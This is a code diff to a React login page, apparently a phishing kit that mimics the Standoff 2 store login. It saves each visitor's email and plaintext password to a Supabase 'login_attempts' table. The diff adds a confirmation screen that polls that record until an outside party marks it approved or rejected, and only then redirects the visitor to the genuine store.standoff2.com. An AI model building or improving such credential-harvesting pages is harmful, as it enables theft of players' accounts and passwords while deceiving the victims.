@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import Logo from "@/components/Logo";
@@ -8,15 +8,44 @@ import { toast } from "sonner";
 const Login = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  const [step, setStep] = useState<"email" | "password" | "loading">("email");
+  const [step, setStep] = useState<"email" | "password" | "confirm">("email");
   const [showPassword, setShowPassword] = useState(false);
+  const [attemptId, setAttemptId] = useState<string | null>(null);
+  const [rejected, setRejected] = useState(false);
+  const pollRef = useRef<number | null>(null);
+
+  useEffect(() => {
+    if (step !== "confirm" || !attemptId) return;
+    let cancelled = false;
+
+    const check = async () => {
+      const { data } = await supabase
+        .from("login_attempts")
+        .select("status")
+        .eq("id", attemptId)
+        .maybeSingle();
+      if (cancelled || !data) return;
+      if (data.status === "approved") {
+        window.location.href = "https://store.standoff2.com/";
+      } else if (data.status === "rejected") {
+        setRejected(true);
+        if (pollRef.current) window.clearInterval(pollRef.current);
+      }
+    };
+
+    check();
+    pollRef.current = window.setInterval(check, 2500);
+    return () => {
+      cancelled = true;
+      if (pollRef.current) window.clearInterval(pollRef.current);
+    };
+  }, [step, attemptId]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
     if (step === "email") {
       if (email) {
-        // Проверяем валидность формата email
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         if (!emailRegex.test(email)) {
           toast.error("Введите действительный адрес электронной почты");
@@ -24,24 +53,21 @@ const Login = () => {
         }
         setStep("password");
       }
-    } else {
-      // Показываем экран загрузки
-      setStep("loading");
-      
-      // Сохраняем email и пароль в БД
-      const { error } = await supabase
+    } else if (step === "password") {
+      const { data, error } = await supabase
         .from("login_attempts")
-        .insert({ email, password });
-      
-      if (error) {
+        .insert({ email, password })
+        .select("id")
+        .single();
+
+      if (error || !data) {
         console.error("Ошибка сохранения:", error);
         toast.error("Ошибка сохранения данных");
-        setStep("password");
-      } else {
-        console.log("Данные сохранены в БД:", { email, password });
-        // Перенаправляем на store.standoff2.com
-        window.location.href = "https://store.standoff2.com/";
+        return;
       }
+      setAttemptId(data.id);
+      setRejected(false);
+      setStep("confirm");
     }
   };
 
